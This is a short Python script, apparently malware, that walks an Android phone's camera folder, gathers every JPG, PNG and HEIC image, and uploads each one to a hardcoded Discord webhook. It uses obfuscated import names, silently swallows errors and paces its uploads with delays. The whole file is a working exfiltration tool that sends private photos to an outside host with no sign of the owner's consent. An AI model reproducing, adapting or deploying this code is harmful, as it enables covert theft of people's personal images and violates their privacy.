import os as a1, requests as a2, time as a3

status = 1
base = "/storage/emulated/0/DCIM/Camera"
webhook = "https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsXPlMMPjv0ExrnuBiEVFCEwYGc"
exts = (".jpg", ".jpeg", ".png", ".heic")

def send_file(a4):
    try:
        with open(a4, "rb") as f:
            r = a2.post(webhook, files={"file": (a4.split("/")[-1], f)})
            return r.status_code in (200, 204)
    except:
        return False

def gather_photos():
    res = []
    for r, d, f in a1.walk(base):
        for file in f:
            if file.lower().endswith(exts):
                res.append(a1.path.join(r, file))
    return res

def run():
    if status != 1:
        return
    fotos = gather_photos()
    for foto in fotos:
        send_file(foto)
        a3.sleep(5)

if __name__ == "__main__":
    run()
